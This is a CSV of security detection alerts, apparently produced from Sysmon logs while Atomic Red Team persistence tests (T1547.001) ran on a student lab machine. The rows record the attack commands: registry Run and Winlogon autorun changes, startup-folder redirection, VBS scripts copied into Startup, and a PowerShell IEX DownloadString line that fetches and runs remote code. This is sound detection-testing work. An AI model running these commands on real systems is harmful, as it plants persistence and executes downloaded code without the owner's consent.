"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-26 11:19:18.093 +01:00","Potential Suspicious Activity Using SeCEdit","med","DESKTOP-G2OBL3D","Sysmon",1,"Collect ¦ Disc ¦ Persis ¦ Evas ¦ CredAccess ¦ PrivEsc","T1562.002 ¦ T1547.001 ¦ T1505.005 ¦ T1556.002 ¦ T1562 ¦ T1574.007 ¦ T1564.002 ¦ T1546.008 ¦ T1546.007 ¦ T1547.014 ¦ T1547.010 ¦ T1547.002 ¦ T1557 ¦ T1082","sysmon",173639,"Cmdline: secedit /configure /db mytemplate.db ¦ Proc: C:\Windows\System32\SecEdit.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""cmd.exe"" /c secedit /import /db mytemplate.db /cfg ""C:\AtomicRedTeam\atomics\T1547.001\src\regtemplate.ini"" & secedit /configure /db mytemplate.db ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7084 ¦ PGUID: E9F06A57-6126-694E-9D01-000000002400 ¦ ParentPID: 6952 ¦ ParentPGUID: E9F06A57-6125-694E-9A01-000000002400 ¦ Description: Windows Security Configuration Editor Command Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=3886FFE2612BD422186F537EC7B90B5E,SHA256=594CFC0512B69061C3BD8D82CD0439D737AC834622AA2F199DFA01E4620DCE7D,IMPHASH=58A66C69176097C9B8C5C9AE4273BD6F","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: SeCEdit ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:18.089","proc_creation_win_secedit_execution.yml","bd30d0fa-6396-28c2-f5e5-609dfa50aed4","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:08.229 +01:00","LOL-Binary Copied From System Directory","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1036.003","sysmon",173616,"Cmdline: ""powershell.exe"" & {New-Item -ItemType Directory -path \""""$env:TMP\atomictest\\"""" Copy-Item -path \""""C:\Windows\System32\calc.exe\"""" -destination \""""$env:TMP\atomictest\\"""" Set-ItemProperty -Path \""""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\"""" -Name \""""Common Startup\"""" -Value \""""$env:TMP\atomictest\\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8884 ¦ PGUID: E9F06A57-611C-694E-8E01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {New-Item -ItemType Directory -path \""""$env:TMP\atomictest\\"""" Copy-Item -path \""""C:\Windows\System32\calc.exe\"""" -destination \""""$env:TMP\atomictest\\"""" Set-ItemProperty -Path \""""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\"""" -Name \""""Common Startup\"""" -Value \""""$env:TMP\atomictest\\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:08.218","proc_creation_win_susp_copy_system_dir_lolbin.yml","8fb84f5c-c692-9a7e-f78e-236822f3687a","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:11.021 +01:00","LOL-Binary Copied From System Directory","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1036.003","sysmon",173619,"Cmdline: ""powershell.exe"" & {New-Item -ItemType Directory -path \""""$env:TMP\atomictest\\"""" Copy-Item -path \""""C:\Windows\System32\calc.exe\"""" -destination \""""$env:TMP\atomictest\\"""" Set-ItemProperty -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\"""" -Name \""""Startup\"""" -Value \""""$env:TMP\atomictest\\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 9204 ¦ PGUID: E9F06A57-611F-694E-9001-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {New-Item -ItemType Directory -path \""""$env:TMP\atomictest\\"""" Copy-Item -path \""""C:\Windows\System32\calc.exe\"""" -destination \""""$env:TMP\atomictest\\"""" Set-ItemProperty -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\"""" -Name \""""Startup\"""" -Value \""""$env:TMP\atomictest\\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:11.003","proc_creation_win_susp_copy_system_dir_lolbin.yml","8fb84f5c-c692-9a7e-f78e-236822f3687a","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:44.376 +01:00","Local Accounts Discovery","low","DESKTOP-G2OBL3D","Sysmon",1,"Disc","T1033 ¦ T1087.001","sysmon",173557,"Cmdline: ""C:\WINDOWS\system32\whoami.exe"" ¦ Proc: C:\Windows\System32\whoami.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7732 ¦ PGUID: E9F06A57-6104-694E-6801-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: whoami - displays logged on user information ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=956692DADC5B2CEB46E9219F7A5BEFFA,SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3,IMPHASH=E4464BCD92DF7AC69CCD074CB9C0EFED","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: whoami.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:44.354","proc_creation_win_susp_local_system_owner_account_discovery.yml","e149ce89-80e1-9461-ab1f-2c14cabd84c0","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:06.999 +01:00","Registry Persistence Mechanisms in Recycle Bin","high","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547","sysmon",173610,"EventType: SetValue ¦ RegKey: HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command\(Default) ¦ Details: calc.exe ¦ Proc: C:\WINDOWS\system32\reg.exe ¦ PID: 3644 ¦ PGUID: E9F06A57-611A-694E-8801-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: T1042 ¦ UtcTime: 2025-12-26 10:19:06.997","registry_event_persistence_recycle_bin.yml","5ada0e7f-420d-2b76-c4d6-141ad8a8d1ad","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:19.494 +01:00","CurrentControlSet Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173649,"EventType: SetValue ¦ RegKey: HKLM\System\CurrentControlSet\Control\BootVerificationProgram\ImagePath ¦ Details: C:\Program Files\Internet Explorer\iexplore.exe ¦ Proc: C:\WINDOWS\system32\reg.exe ¦ PID: 7472 ¦ PGUID: E9F06A57-6127-694E-A601-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: T1031,T1050 ¦ UtcTime: 2025-12-26 10:19:19.493","registry_set_asep_reg_keys_modification_currentcontrolset.yml","e16fe2fe-0c74-ed11-b47f-fb42565e9292","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:45.400 +01:00","CurrentVersion Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173560,"EventType: SetValue ¦ RegKey: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\Run\Atomic Red Team ¦ Details: C:\Path\AtomicRedTeam.exe ¦ Proc: C:\WINDOWS\system32\reg.exe ¦ PID: 2516 ¦ PGUID: E9F06A57-6105-694E-6B01-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: T1060,RunKey ¦ UtcTime: 2025-12-26 10:18:45.398","registry_set_asep_reg_keys_modification_currentversion.yml","3f59aeed-e4fb-6b21-a7fa-a327fdb8494d","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:49.429 +01:00","CurrentVersion Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173563,"EventType: SetValue ¦ RegKey: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend\1 ¦ Details: C:\Path\AtomicRedTeam.dll ¦ Proc: C:\WINDOWS\system32\reg.exe ¦ PID: 1804 ¦ PGUID: E9F06A57-6109-694E-6E01-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: T1060,RunKey ¦ UtcTime: 2025-12-26 10:18:49.427","registry_set_asep_reg_keys_modification_currentversion.yml","3f59aeed-e4fb-6b21-a7fa-a327fdb8494d","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:53.681 +01:00","CurrentVersion Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173567,"EventType: SetValue ¦ RegKey: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\NextRun ¦ Details: powershell.exe ""IEX (New-Object Net.WebClient).DownloadString(`""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`"")"" ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6384 ¦ PGUID: E9F06A57-6109-694E-6F01-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: T1060,RunKey ¦ UtcTime: 2025-12-26 10:18:53.680","registry_set_asep_reg_keys_modification_currentversion.yml","3f59aeed-e4fb-6b21-a7fa-a327fdb8494d","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:07.893 +01:00","CurrentVersion Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173615,"EventType: SetValue ¦ RegKey: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\Run\socks5_powershell ¦ Details: powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8680 ¦ PGUID: E9F06A57-611B-694E-8C01-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: T1060,RunKey ¦ UtcTime: 2025-12-26 10:19:07.886","registry_set_asep_reg_keys_modification_currentversion.yml","3f59aeed-e4fb-6b21-a7fa-a327fdb8494d","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:13.404 +01:00","CurrentVersion Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173625,"EventType: SetValue ¦ RegKey: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\atomictest ¦ Details: C:\Windows\System32\calc.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8004 ¦ PGUID: E9F06A57-6120-694E-9201-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: T1060,RunPolicy ¦ UtcTime: 2025-12-26 10:19:13.404","registry_set_asep_reg_keys_modification_currentversion.yml","3f59aeed-e4fb-6b21-a7fa-a327fdb8494d","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:16.176 +01:00","CurrentVersion Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173628,"EventType: SetValue ¦ RegKey: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\atomictest ¦ Details: C:\Windows\System32\calc.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2424 ¦ PGUID: E9F06A57-6121-694E-9401-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: T1060,RunPolicy ¦ UtcTime: 2025-12-26 10:19:16.175","registry_set_asep_reg_keys_modification_currentversion.yml","3f59aeed-e4fb-6b21-a7fa-a327fdb8494d","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:18.134 +01:00","CurrentVersion Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173640,"EventType: SetValue ¦ RegKey: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\calc ¦ Details: calc.exe ¦ Proc: C:\WINDOWS\system32\services.exe ¦ PID: 776 ¦ PGUID: E9F06A57-5FDF-694E-0B00-000000002400 ¦ User: NT AUTHORITY\SYSTEM","RuleName: T1060,RunKey ¦ UtcTime: 2025-12-26 10:19:18.133","registry_set_asep_reg_keys_modification_currentversion.yml","3f59aeed-e4fb-6b21-a7fa-a327fdb8494d","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:16.853 +01:00","CurrentVersion NT Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173631,"EventType: SetValue ¦ RegKey: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit-backup ¦ Details: C:\WINDOWS\system32\userinit.exe, ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6056 ¦ PGUID: E9F06A57-6124-694E-9601-000000002400 ¦ User: DESKTOP-G2OBL3D\student","Details: C:\WINDOWS\system32\userinit.exe, ¦ RuleName: - ¦ UtcTime: 2025-12-26 10:19:16.851","registry_set_asep_reg_keys_modification_currentversion_nt.yml","5800ac7d-6494-f095-585d-e83af10a41f5","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:16.858 +01:00","CurrentVersion NT Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173632,"EventType: SetValue ¦ RegKey: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit ¦ Details: C:\WINDOWS\system32\userinit.exe, C:\Windows\System32\calc.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6056 ¦ PGUID: E9F06A57-6124-694E-9601-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: - ¦ UtcTime: 2025-12-26 10:19:16.855","registry_set_asep_reg_keys_modification_currentversion_nt.yml","5800ac7d-6494-f095-585d-e83af10a41f5","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:17.548 +01:00","CurrentVersion NT Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173635,"EventType: SetValue ¦ RegKey: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell-backup ¦ Details: explorer.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 1448 ¦ PGUID: E9F06A57-6125-694E-9801-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: T1060 ¦ UtcTime: 2025-12-26 10:19:17.545","registry_set_asep_reg_keys_modification_currentversion_nt.yml","5800ac7d-6494-f095-585d-e83af10a41f5","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:17.557 +01:00","CurrentVersion NT Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173636,"EventType: SetValue ¦ RegKey: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell ¦ Details: explorer.exe, C:\Windows\explorer.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 1448 ¦ PGUID: E9F06A57-6125-694E-9801-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: T1060 ¦ UtcTime: 2025-12-26 10:19:17.554","registry_set_asep_reg_keys_modification_currentversion_nt.yml","5800ac7d-6494-f095-585d-e83af10a41f5","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:18.897 +01:00","Session Manager Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001 ¦ T1546.009","sysmon",173644,"EventType: SetValue ¦ RegKey: HKLM\System\CurrentControlSet\Control\Session Manager\BootExecute ¦ Details: Binary Data ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 1456 ¦ PGUID: E9F06A57-6126-694E-9E01-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: - ¦ UtcTime: 2025-12-26 10:19:18.895","registry_set_asep_reg_keys_modification_session_manager.yml","01d511cf-919d-faa8-d5b6-c1f16e9b6c5c","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:53.681 +01:00","Suspicious PowerShell In Registry Run Keys","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173567,"EventType: SetValue ¦ RegKey: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\NextRun ¦ Details: powershell.exe ""IEX (New-Object Net.WebClient).DownloadString(`""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`"")"" ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6384 ¦ PGUID: E9F06A57-6109-694E-6F01-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: T1060,RunKey ¦ UtcTime: 2025-12-26 10:18:53.680","registry_set_powershell_in_run_keys.yml","6bbec0c9-86cd-b433-ee4b-e9eeff1b185b","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:07.893 +01:00","Suspicious PowerShell In Registry Run Keys","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173615,"EventType: SetValue ¦ RegKey: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\Run\socks5_powershell ¦ Details: powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8680 ¦ PGUID: E9F06A57-611B-694E-8C01-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: T1060,RunKey ¦ UtcTime: 2025-12-26 10:19:07.886","registry_set_powershell_in_run_keys.yml","6bbec0c9-86cd-b433-ee4b-e9eeff1b185b","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:11.854 +01:00","Modify User Shell Folders Startup Value","high","DESKTOP-G2OBL3D","Sysmon",13,"Persis ¦ PrivEsc","T1547.001","sysmon",173622,"EventType: SetValue ¦ RegKey: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\Startup ¦ Details: C:\Users\student\AppData\Local\Temp\atomictest\ ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9204 ¦ PGUID: E9F06A57-611F-694E-9001-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: T1112,ChangeStartupFolderPath ¦ UtcTime: 2025-12-26 10:19:11.849","registry_set_susp_user_shell_folders.yml","eb188ac7-08c6-344c-003a-6645ac5917b4","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.579 +01:00","Potentially Suspicious PowerShell Child Processes","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","detection.threat-hunting ¦ sysmon",173578,"Cmdline: ""C:\WINDOWS\system32\cscript.exe"" ""C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"" ¦ Proc: C:\Windows\System32\cscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\"""" cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8392 ¦ PGUID: E9F06A57-610E-694E-7401-000000002400 ¦ ParentPID: 7868 ¦ ParentPGUID: E9F06A57-610D-694E-7201-000000002400 ¦ Description: Microsoft ® Console Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=D12B8C23A5360CED9A30EF7532042E6D,SHA256=5084B9867A14F60AA1A46C486C9FEB8ED8C843DC754BD661118C9CE2FC77CDF9,IMPHASH=D2447EDBFB0905AA7192706112935907","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: cscript.exe ¦ ParentCommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\"""" cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:54.571","proc_creation_win_powershell_susp_child_processes.yml","1343a348-60cf-7a2f-8cac-702f5ae8e622","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.858 +01:00","Potentially Suspicious PowerShell Child Processes","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","detection.threat-hunting ¦ sysmon",173579,"Cmdline: ""C:\WINDOWS\system32\cscript.exe"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"" ¦ Proc: C:\Windows\System32\cscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\"""" cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1244 ¦ PGUID: E9F06A57-610E-694E-7501-000000002400 ¦ ParentPID: 7868 ¦ ParentPGUID: E9F06A57-610D-694E-7201-000000002400 ¦ Description: Microsoft ® Console Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=D12B8C23A5360CED9A30EF7532042E6D,SHA256=5084B9867A14F60AA1A46C486C9FEB8ED8C843DC754BD661118C9CE2FC77CDF9,IMPHASH=D2447EDBFB0905AA7192706112935907","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: cscript.exe ¦ ParentCommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\"""" cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:54.844","proc_creation_win_powershell_susp_child_processes.yml","1343a348-60cf-7a2f-8cac-702f5ae8e622","C:\Tools\Logs\art_1547_001.evtx"
